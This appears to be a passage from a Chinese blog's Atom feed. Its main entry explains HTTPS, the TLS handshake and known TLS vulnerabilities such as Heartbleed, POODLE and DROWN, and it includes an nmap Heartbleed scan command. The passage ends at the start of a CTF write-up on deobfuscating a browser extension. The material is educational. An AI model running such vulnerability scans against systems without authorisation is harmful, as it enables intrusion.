    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;转载自 Annevi&lt;/p&gt;
&lt;p&gt;在我查漏补缺的时候帮到我很多&lt;/p&gt;


	&lt;div class=&quot;row&quot;&gt;
    &lt;embed s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTPS 协议学习</title>
    <link href="https://me.liki.link/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://me.liki.link/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-08-12T04:11:32.000Z</published>
    <updated>2021-10-18T04:20:42.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前实习面试之前去参考了 Annevi 的博客，</p><p>发现了很多很棒的记录，</p><p>打算转载一些</p><h2 id="什么是https？"><a href="#什么是https？" class="headerlink" title="什么是https？"></a>什么是https？</h2><p>https协议(Hyper Text Transfer Protocol over SecureSocket Layer)，翻译过来就是<code>建立在安全套接字层上的超文本传输协议(http)</code>，很显然，https是为了确保http协议的安全性而出现的。https在http的基础上加入了<code>SSL</code>协议(SSL3.1后称TLS)以下均称TLS，通过<code>TLS</code>协议使得http数据包能够安全的在网络中进行传输。现在大多数的站点都已经使用了https协议进行通信，也就是在浏览器中看到的所谓的<code>小绿锁</code>🔐。</p><p><img src="https://cdn.annevi.cn/image-20210202142221315.png" alt="image-20210202142221315" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210202142221315.png" class="lozad post-image"></p><h2 id="为什么需要https？"><a href="#为什么需要https？" class="headerlink" title="为什么需要https？"></a>为什么需要https？</h2><p>通过上面的介绍可以知道，使用https是为了确保http通道的安全性，那么这个安全性究竟体现在哪里呢？</p><p>在说https所解决的安全问题之前，我们首先需要了解一种攻击手法: <code>中间人攻击</code></p><blockquote><p><strong>中间人攻击</strong>（英语：<strong>M</strong>an-<strong>i</strong>n-<strong>t</strong>he-<strong>m</strong>iddle attack，缩写：<strong>MITM</strong>）在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a>和<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>领域中是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。</p></blockquote><p>从上述资料中可以知道，中间人攻击实际上就是攻击者监听并截获了通信双方的数据，对这些数据加以修改后代替原有的发送方将修改后的信息发送给原先的接收方，在这个过程中，中间人就相当于是一个”透明代理“，通信双方并不知道有这个”中间人“的存在。</p><p>而要成功的进行中间人攻击是有条件的：</p><blockquote><p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互<a href="https://zh.wikipedia.org/wiki/%E8%AE%A4%E8%AF%81">认证</a>的攻击。</p></blockquote><p>回到http数据包网络通信过程中，我们知道http协议的数据是在传输层通过TCP协议进行封装传输的，而TCP协议在传输的过程中则是以明文形式进行的，也就是在http数据包在网络中明文”裸奔”。</p><p><img src="https://cdn.annevi.cn/http.png" alt="http" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/http.png" class="lozad post-image"></p><p>TCP协议虽确保了通信双方的<code>可靠交付</code>但是并没有对通信双方进行<code>身份认证</code>，也就是说，http客户端并不知道与自己通信的是不是想要访问的”真实”服务端，因此就给中间人攻击提供了机会。</p><p>由于HTTP存在被中间人攻击的问题，人们在思考如何解决这一安全问题的时候提出了https协议，https协议通过SSL层对http数据包进行加密，同时使用数字证书等手段对通信双方的身份进行验证，较好的解决了这一安全问题。</p><h2 id="https具体工作过程"><a href="#https具体工作过程" class="headerlink" title="https具体工作过程"></a>https具体工作过程</h2><p>通过上面的介绍可以知道，https是将http协议通过TLS的封装后的一种安全协议。http与https在网络传输过程中的基本结构如下</p><p><img src="https://cdn.annevi.cn/image-20210202164732706.png" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210202164732706.png" class="lozad post-image"></p><p>https协议在传输的过程中首先将http原始请求包经过TLS层进行加密封装再送入传输层进行TCP传输。</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在介绍https工作原理之前，我们需要简单的了解一些密码学的基础知识</p><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><blockquote><p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。</p></blockquote><p>对称加密其特点主要是效率高、速度快，但是安全性差，由于加解密使用相同的密钥，因此密钥管理负担较重。主要算法有DES、3DES、AES、RC5、RC6等。</p><h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><blockquote><p>非对称加密加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。</p></blockquote><p>非对称加密由于其加解密密钥不同而得名，其安全性更高，密钥管理方便。但是加密和解密耗时长，效率差。</p><p>与对称加密相比，非对称加密无需在客户端和服务端之间共享密钥，只要私钥不发送给任何用户，即是公钥在互联网上被截获，也无法被解密，而只有公钥是没有任何攻击价值的。常见的非对称加密算法有RSA等，非对称加解密过程：</p><ol><li>服务端生成一堆公钥和私钥</li><li>私钥仅由服务端保存，公钥通过互联网发送给客户端。</li><li>客户端使用公钥加密明文并在网络中传输给服务端</li><li>服务端使用自己持有的私钥解密密文得到对应的明文</li></ol><h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h4><p>在一封信中，文末的签名是为了表示这封信是签名者写的。计算机中，数字签名也是相同的含义：证明消息是某个特定的人，而不是随随便便一个人发送的（有效性）；除此之外，数字签名还能证明消息没有被篡改（完整性）。</p><blockquote><p>简单来说，数字签名（digital signature）是公钥密码的逆应用：用<strong>私钥</strong>加密消息，用<strong>公钥</strong>解密消息。</p><p>用私钥加密的消息称为<strong>签名</strong>，只有拥有私钥的用户可以生成签名。<br>用公钥解密签名这一步称为<strong>验证签名</strong>，所有用户都可以验证签名(因为公钥是公开的)</p></blockquote><p>签名的生成，一般来说，不直接对消息进行签名，而是对消息的哈希值进行签名，步骤如下。</p><ol><li>对消息进行哈希计算，得到哈希值</li><li>利用私钥对哈希值进行加密，生成签名</li><li>将签名附加在消息后面，一起发送过去</li></ol><p>签名的验证</p><ol><li>收到消息后，提取消息中的签名</li><li>用公钥对签名进行解密，得到哈希值1。</li><li>对消息中的正文进行哈希计算，得到哈希值2。</li><li>比较哈希值1和哈希值2，如果相同，则验证成功。</li></ol><p><strong>简单地说，数字签名就是使用<code>私钥</code>去加密<code>消息摘要</code>得到的密文。</strong></p><h4 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h4><p>证书实际上就是对<strong>公钥</strong>进行数字签名，它是对公钥合法性提供证明的技术。</p><blockquote><p>数字证书是指在互联网通讯中标志通讯各方身份信息的一个数字认证，人们可以在网上用它来识别对方的身份。数字证书对网络用户在计算机网络交流中的信息和数据等以加密或解密的形式保证了信息和数据的完整性和安全性。</p></blockquote><p>考虑这样一种场景：我们对签名进行验证时，需要用到公钥。如果公钥也是伪造的，那怎么办？如果公钥是假的，验证数字签名那就无从谈起，根本不可能从数字签名确定对方的合法性。</p><p>在非对称加密通信过程中，服务器需要将公钥发送给客户端，在这一过程中，公钥很可能会被第三方拦截并替换，然后这个第三方就可以冒充服务器与客户端进行通信，这就是传说中的“中间人攻击”(man in the middle attack)。解决此问题的方法是通过受信任的第三方交换公钥，具体做法就是服务器不直接向客户端发送公钥，而是要求受信任的第三方，也就是证书认证机构 (Certificate Authority, 简称 CA)将公钥合并到数字证书中，然后服务器会把公钥连同证书一起发送给客户端，私钥则由服务器自己保存以确保安全。数字证书一般包含以下内容：</p><ol><li>证书所有者的公钥</li><li>证书所有者的专有名称</li><li>证书颁发机构的专有名称</li><li>证书的有效起始日期</li><li>证书的过期日期</li><li>证书数据格式的版本号</li><li>序列号，这是证书颁发机构为该证书分配的唯一标识符</li></ol><p><img src="https://cdn.annevi.cn/image-20210205153627722.png" alt="image-20210205153627722" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210205153627722.png" class="lozad post-image"></p><p>接下来又有问题了：验证证书中的数字签名需要另一个公钥，那么这个公钥的合法性又该如何保证？该问题可以无限循环下去，岂不是到不了头了？这已经是个社会学问题了。我们为什么把钱存进银行？因为我们相信银行，它是一个可信的机构（虽然也有破产的风险）。跟银行一样，我们需要一个可信的机构来颁发证书和提供公钥，只要是它提供的公钥，我们就相信是合法的。</p><p>这种机构称为认证机构(Certification Authority， CA)。CA就是能够认定”公钥确实属于此人”，并能生成公钥的数字签名的组织或机构。CA有国际性组织和政府设立的组织，也有通过提供认证服务来盈利的组织。</p><p><img src="https://cdn.annevi.cn/image-20210205154525604.png" alt="image-20210205154525604" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210205154525604.png" class="lozad post-image"></p><h4 id="证书链"><a href="#证书链" class="headerlink" title="证书链"></a>证书链</h4><p>证书链，也称为证书路径，是用于认证实体合法身份的证书列表，具体到 HTTPS 通信中，就是为了验证服务器的合法身份。之所以使用证书链，是为了保证根证书 的安全，中间层可以看做根证书的代理，起到了缓冲的作用。</p><h3 id="从经典问题谈起"><a href="#从经典问题谈起" class="headerlink" title="从经典问题谈起"></a>从经典问题谈起</h3><p>我们从一个经典的问题开始：<strong>当我们在浏览器中输入一个启用了https的域名到我们看到页面回显，发生了什么？</strong></p><p>在以往http的情况下，这个问题的答案相信许多人已经非常清晰了，但是若目标站点启用了https，又会有什么不一样的地方呢？</p><p>带着这个问题，我们重新来分析一下这个“加强版”的经典面试题。</p><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>由于web服务是建立在TCP协议之上的，因此需要使用ip地址来进行通信，而域名解析就是通过域名去DNS服务器查询获取对应的IP的过程，也是这个经典问题的第一步。</p><h4 id="建立TCP连接"><a href="#建立TCP连接" class="headerlink" title="建立TCP连接"></a>建立TCP连接</h4><p>浏览器拿到对应域名的IP地址后，准备向目标服务器发起连接请求，由于我们是向web服务器发起连接，因此是通过TCP协议进行连接的，自然也就有TCP的三次握手建立连接的过程。我们可以通过<code>wireshark</code>抓包来查看这一过程。</p><p><img src="https://cdn.annevi.cn/image-20210209111021113.png" alt="image-20210209111021113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210209111021113.png" class="lozad post-image"></p><p>通过设置简单的过滤器，访问<code>https://annevi.cn</code>即可获取到三次握手的过程。我们顺带来具体的看一下。</p><ol><li>首先是客户端向服务器发送一个<code>SYN</code>，表示要求建立连接，同时发送<code>Seq=0</code>,随后客户端进入<code>SYN-SENT</code>阶段。</li><li>服务器端接收到来自客户端的TCP报文之后，结束LISTEN阶段。并返回一段TCP报文，构造一个<code>[SYN ACK]</code>的数据包，同时将ack值设为<code>seq+1</code>。随后服务器端进入SYN-RCVD阶段。</li><li>客户端接收到来自服务器端的确认收到数据的TCP报文之后，明确了从客户端到服务器的数据传输是正常的，结束SYN-SENT阶段。并返回最后一段TCP报文,设置<code>seq+=1</code> ack则等于服务器端数据包的<code>seq+1</code>,随后客户端进入ESTABLISHED阶段。</li></ol><p>完成上述基本步骤后，一个完整的TCP连接就成功建立了</p><p><img src="https://cdn.annevi.cn/861fa058f2da35f8efa70b29bf7c45fd8689.gif" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/861fa058f2da35f8efa70b29bf7c45fd8689.gif" class="lozad post-image"></p><h4 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手*"></a>TLS握手*</h4><p>为了建立安全连接，通信双方在完成TCP的三次握手之后，紧接着就要进行TLS的<strong>四次握手</strong>，TLS握手的<strong>目的</strong>主要是为了：</p><ul><li>商定双方通信所使用的的 TLS 版本 (例如 TLS1.0, 1.2, 1.3等等)；</li><li>确定双方所要使用的密码组合；</li><li>客户端通过服务器的公钥和数字证书上的数字签名验证服务端的身份；</li><li>生成会话密钥，该密钥将用于握手结束后的对称加密。</li></ul><p><img src="https://cdn.annevi.cn/70.png" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/70.png" class="lozad post-image"></p><p>下面将介绍一下TLS握手的过程</p><h5 id="Client-Hello"><a href="#Client-Hello" class="headerlink" title="Client Hello"></a>Client Hello</h5><p>客户端生成并发送一段随机字符串以及所支持的加密算法，如图：</p><p><img src="https://cdn.annevi.cn/image-20210214185926765.png" alt="image-20210214185926765" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210214185926765.png" class="lozad post-image"></p><h5 id="Server-Hello"><a href="#Server-Hello" class="headerlink" title="Server Hello"></a>Server Hello</h5><p>服务器发送”Server Hello”消息对客户端进行回应，该消息包含了<strong>数字证书</strong>，服务器选择的密码组合和”server random”随机字符串</p><p><img src="https://cdn.annevi.cn/image-20210214185419536.png" alt="image-20210214185419536" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210214185419536.png" class="lozad post-image"></p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>客户端对服务器发来的证书进行验证，确保对方的合法身份，验证过程可以细化为以下几个步骤：</p><ol><li>检查数字签名</li><li>验证证书链</li><li>检查证书的有效期</li><li>检查证书的撤回状态 (撤回代表证书已失效)</li></ol><h5 id="Pre-master-secret"><a href="#Pre-master-secret" class="headerlink" title="Pre-master secret"></a>Pre-master secret</h5><p>客户端在前面的步骤中已经获取到了服务端所给予的公钥，因此就可以发送使用这个公钥加密之后的另一个随机字符串”pre-master secret (预主密钥)”，这个字符串是经过服务器的公钥加密过的，只有对应的私钥才能解密。</p><h5 id="解密-Pre-master-secret"><a href="#解密-Pre-master-secret" class="headerlink" title="解密 Pre-master secret"></a>解密 Pre-master secret</h5><p>服务器使用私钥解密<code>Pre-master secret</code>,获取其明文。</p><h5 id="生成共享密钥"><a href="#生成共享密钥" class="headerlink" title="生成共享密钥"></a>生成共享密钥</h5><p>客户端和服务器均使用 <code>client random</code>，<code>server random</code> 和 <code>premaster secret</code>，并通过相同的算法生成相同的共享密钥 <strong>KEY</strong>，用于后面的对称加密传输。</p><h5 id="客户端就绪"><a href="#客户端就绪" class="headerlink" title="客户端就绪"></a><strong>客户端就绪</strong></h5><p>客户端发送经过共享密钥 <strong>KEY</strong>加密过的 <code>finished</code>信号。</p><h5 id="服务端就绪"><a href="#服务端就绪" class="headerlink" title="服务端就绪"></a>服务端就绪</h5><p>服务器发送经过共享密钥 **KEY **加密过的<code>finished</code>信号。</p><h5 id="达成安全通信"><a href="#达成安全通信" class="headerlink" title="达成安全通信"></a><strong>达成安全通信</strong></h5><p>握手完成，双方<strong>使用对称加密</strong>进行安全通信。</p><hr><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>总的来说，TLS的四次握手主要概括如下：</p><p>客户端发出请求，向服务端提供以下信息：</p><ol><li>支持的协议版本，比如 TLS 1.0 版。</li><li>一个客户端生成的随机数，稍后用于生成”对话密钥”。</li><li>支持的加密方法，比如 RSA 公钥加密。</li><li>支持的压缩方法。</li></ol><p>服务器回应以下信息：</p><ol><li>确认使用的加密通信协议版本，比如 TLS 1.0 版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</li><li>确认使用的加密方法，比如 RSA 公钥加密，返回加密公钥</li><li>服务器证书</li></ol><p>客户端回应</p><ol><li>验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。</li><li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。</li><li>使用约定好的 HASH 计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。</li></ol><p>服务器</p><ol><li>使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证是否与浏览器发来的一致。</li><li>使用密码加密一段握手消息，发送给浏览器。</li></ol><p><img src="https://cdn.annevi.cn/bVbCCMD.png" alt="SSL : TLS 握手过程" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/bVbCCMD.png" class="lozad post-image"></p><p>可以看到，https 建立连接需要7次握手(TCP 3次 TLS 4次)</p><h2 id="TLS-的安全问题"><a href="#TLS-的安全问题" class="headerlink" title="TLS 的安全问题"></a>TLS 的安全问题</h2><h3 id="OpenSSL心脏滴血漏洞"><a href="#OpenSSL心脏滴血漏洞" class="headerlink" title="OpenSSL心脏滴血漏洞"></a>OpenSSL心脏滴血漏洞</h3><blockquote><p>2014年4月8日，互联网上曝出了严重一个漏洞称为Heartbleed，该漏洞由安全公司Codenomicon和谷歌安全工程师发现。Heartbleed漏洞，造成许任何人在互联网上阅读系统的内存保护脆弱的OpenSSL的软件版本。 这种妥协密钥用于识别服务提供者和加密流量,用户名和密码的和实际的内容。 这允许攻击者窃听通信、窃取数据直接从服务和用户和模拟服务和用户。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>OpenSSL 在实现 TLS 和 DTLS 的心跳处理逻辑时，存在编码缺陷。OpenSSL 的心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合，攻击者可以利用这点，构造异常的数据包，来获取心跳数据所在的内存区域的后续数据。这些数据中可能包含了证书私钥、用户名、用户密码、用户邮箱等敏感信息。该漏洞允许攻击者，从内存中读取多达64KB的数据。</p><h4 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h4><ul><li>使用了openssl扩展库加密的网络协议</li><li>https</li><li>SSL VPN</li><li>邮件服务器</li></ul><h4 id="测试方案"><a href="#测试方案" class="headerlink" title="测试方案"></a>测试方案</h4><p>nmap</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV -p 443 --script ssl-heartbleed.nse [Target]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://filippo.io/Heartbleed/">https://filippo.io/Heartbleed/</a></p><p><a href="http://wangzhan.360.cn/heartbleed/">http://wangzhan.360.cn/heartbleed/</a></p><h3 id="Downgrade（降级攻击）"><a href="#Downgrade（降级攻击）" class="headerlink" title="Downgrade（降级攻击）"></a>Downgrade（降级攻击）</h3><p>降级攻击是一种对计算机系统或者通信协议的攻击，在降级攻击中，攻击者故意使系统放弃新式、安全性高的工作方式，反而使用为向下兼容而准备的老式、安全性差的工作方式，降级攻击常被用于中间人攻击，讲加密的通信协议安全性大幅削弱，得以进行原本不可能做到的攻击。 在现代的回退防御中，使用单独的信号套件来指示自愿降级行为，需要理解该信号并支持更高协议版本的服务器来终止协商，该套件是 TLS_FALLBACK_SCSV(0x5600)</p><h3 id="MITM（中间人攻击）"><a href="#MITM（中间人攻击）" class="headerlink" title="MITM（中间人攻击）"></a>MITM（中间人攻击）</h3><p>MITM(Man-in-the-MiddleAttack) ，是指攻击者与通讯的两端分别创建独立的联系，并交换其所有收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个对话都被攻击者完全控制，在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。一个中间人攻击能成功的前提条件是攻击者能够将自己伪装成每个参与会话的终端，并且不被其他终端识破。</p><h3 id="BEAST-野兽攻击）"><a href="#BEAST-野兽攻击）" class="headerlink" title="BEAST (野兽攻击）"></a>BEAST (野兽攻击）</h3><p>BEAST(CVE-2011-3389) BEAST是一种明文攻击，通过从SSL/TLS加密的会话中获取受害者的COOKIE值（通过进行一次会话劫持攻击），进而篡改一个加密算法的 CBC（密码块链）的模式以实现攻击目录，其主要针对TLS1.0和更早版本的协议中的对称加密算法CBC模式。</p><h3 id="CRIME（罪恶攻击）"><a href="#CRIME（罪恶攻击）" class="headerlink" title="CRIME（罪恶攻击）"></a>CRIME（罪恶攻击）</h3><p>CRIME(CVE-2012-4929)，全称Compression Ratio Info-leak Made Easy，这是一种因SSL压缩造成的安全隐患，通过它可窃取启用数据压缩特性的HTTPS或SPDY协议传输的私密Web Cookie。在成功读取身份验证Cookie后，攻击者可以实行会话劫持和发动进一步攻击。</p><p>SSL 压缩在下述版本是默认关闭的： nginx 1.1.6及更高/1.0.9及更高（如果使用了 OpenSSL 1.0.0及更高）， nginx 1.3.2及更高/1.2.2及更高（如果使用较旧版本的 OpenSSL）。</p><p>如果你使用一个早期版本的 nginx 或 OpenSSL，而且你的发行版没有向后移植该选项，那么你需要重新编译没有一个 ZLIB 支持的 OpenSSL。这会禁止 OpenSSL 使用 DEFLATE 压缩方式。如果你禁用了这个，你仍然可以使用常规的 HTML DEFLATE 压缩。</p><h3 id="POODLE漏洞（卷毛狗攻击）"><a href="#POODLE漏洞（卷毛狗攻击）" class="headerlink" title="POODLE漏洞（卷毛狗攻击）"></a>POODLE漏洞（卷毛狗攻击）</h3><p>2014年10月14号由Google发现的POODLE漏洞，全称是Padding Oracle On Downloaded Legacy Encryption vulnerability，又被称为“贵宾犬攻击”（CVE-2014-3566），POODLE漏洞只对CBC模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者窃取采用SSL3.0版加密通信过程中的内容，对填充字节修改并且利用预置填充来恢复加密内容，以达到攻击目的。</p><h3 id="TLS-POODLE（TLS卷毛狗攻击）"><a href="#TLS-POODLE（TLS卷毛狗攻击）" class="headerlink" title="TLS POODLE（TLS卷毛狗攻击）"></a>TLS POODLE（TLS卷毛狗攻击）</h3><p>TLS POODLE(CVE-2014-8730) 该漏洞的原理和POODLE漏洞的原理一致，但不是SSL3协议。由于TLS填充是SSLv3的一个子集，因此可以重新使用针对TLS的POODLE攻击。TLS对于它的填充格式是非常严格的，但是一些TLS实现在解密之后不执行填充结构的检查。即使使用TLS也不会容易受到POODLE攻击的影响。</p><h3 id="CCS"><a href="#CCS" class="headerlink" title="CCS"></a>CCS</h3><p>CCS(CVE-2014-0224) 全称openssl MITM CCS injection attack，Openssl 0.9.8za之前的版本、1.0.0m之前的以及1.0.1h之前的openssl没有适当的限制ChangeCipherSpec信息的处理，这允许中间人攻击者在通信之间使用0长度的主密钥。</p><h3 id="FREAK"><a href="#FREAK" class="headerlink" title="FREAK"></a>FREAK</h3><p>FREAK(CVE-2015-0204) 客户端会在一个全安全强度的RSA握手过程中接受使用弱安全强度的出口RSA密钥，其中关键在于客户端并没有允许协商任何出口级别的RSA密码套件。</p><h3 id="DROWN（溺水攻击-溺亡攻击）"><a href="#DROWN（溺水攻击-溺亡攻击）" class="headerlink" title="DROWN（溺水攻击/溺亡攻击）"></a>DROWN（溺水攻击/溺亡攻击）</h3><p>2016年3月发现的针对TLS的新漏洞攻击——DROWN（Decrypting RSA with Obsolete and Weakened eNcryption，CVE-2016-0800），也即利用过时的、弱化的一种RSA加密算法来解密破解TLS协议中被该算法加密的会话密钥。 具体说来，DROWN漏洞可以利用过时的SSLv2协议来解密与之共享相同RSA私钥的TLS协议所保护的流量。 DROWN攻击依赖于SSLv2协议的设计缺陷以及知名的Bleichenbacher攻击。</p><p>通常检查以下两点服务器的配置</p><ul><li>服务器允许SSL2连接，需要将其关闭。</li><li>私钥同时用于允许SSL2连接的其他服务器。例如，Web服务器和邮件服务器上使用相同的私钥和证书，如果邮件服务器支持SSL2，即使web服务器不支持SSL2，攻击者可以利用邮件服务器来破坏与web服务器的TLS连接。</li></ul><h3 id="Openssl-Padding-Oracle"><a href="#Openssl-Padding-Oracle" class="headerlink" title="Openssl Padding Oracle"></a>Openssl Padding Oracle</h3><p>Openssl Padding Oracle(CVE-2016-2107) openssl 1.0.1t到openssl 1.0.2h之前没有考虑某些填充检查期间的内存分配，这允许远程攻击者通过针对AES CBC会话的padding-oracle攻击来获取敏感的明文信息。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://segmentfault.com/a/1190000012731888">https://segmentfault.com/a/1190000012731888</a></li><li><a href="https://segmentfault.com/a/1190000021559557">https://segmentfault.com/a/1190000021559557</a></li><li><a href="https://zhuanlan.zhihu.com/p/22142170">https://zhuanlan.zhihu.com/p/22142170</a></li><li><a href="https://juejin.cn/post/6844904089495535624#heading-14">https://juejin.cn/post/6844904089495535624#heading-14</a></li><li><a href="https://zhuanlan.zhihu.com/p/22917510">https://zhuanlan.zhihu.com/p/22917510</a></li><li><a href="https://payloads.online/archivers/2018-04-27/5">https://payloads.online/archivers/2018-04-27/5</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前实习面试之前去参考了 Annevi 的博客，&lt;/p&gt;
&lt;p&gt;发现了很多很棒的记录，&lt;/p&gt;
&lt;p&gt;打算转载一些&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DEFCON 2021 Quals threefactooorx</title>
    <link href="https://me.liki.link/20210503/DEFCON-2021-Quals-threefactooorx/"/>
    <id>https://me.liki.link/20210503/DEFCON-2021-Quals-threefactooorx/</id>
    <published>2021-05-03T03:50:25.000Z</published>
    <updated>2021-10-18T03:57:17.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON-2021-Quals-threefactooorx"><a href="#DEFCON-2021-Quals-threefactooorx" class="headerlink" title="DEFCON 2021 Quals threefactooorx"></a>DEFCON 2021 Quals threefactooorx</h1><p>直接转 4qE 的了 233</p><h2 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h2><p>插件源码的主要部分在 <code>content_script.js</code>， 但因为经过混淆，根本不是给人看的，于是得先反混淆。考虑到 js 本身就是解释型语言，我可以直接在 chrome devtools 中下断点，然后在 console 里打印我想要的变量值。最外层的函数不是特别多，所以依次下断点配合 devtools 的控制台获取变量。</p><p>这段过程都是体力活，就不具体描述了，最后反混淆出了大致能看的 js 代码 <a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/readable_code.js">readable_code.js</a>。</p><p>最后看下来，反混淆的部分是最重要的，因为后面的分析都不是很难。</p><h2 id="本地分析"><a href="#本地分析" class="headerlink" title="本地分析"></a>本地分析</h2><p>反混淆以后，可以看到在源码的最后有一段代码会定时向后台获取 flag 并输出。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">observer<span class="token punctuation">[</span><span class="token string">"observe"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">,</span>    console<span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"The observer is observing."</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> _0xd26915 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      _0xd26915<span class="token punctuation">[</span><span class="token string">"getflag"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _0x10b2d5<span class="token punctuation">[</span><span class="token string">"xOsuT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">//true</span>          chrome<span class="token punctuation">[</span><span class="token string">"runtime"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"sendMessage"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0xd26915<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x336e82</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// _0x336382 is response from backend included with flag</span>            <span class="token constant">FLAG</span> <span class="token operator">=</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token 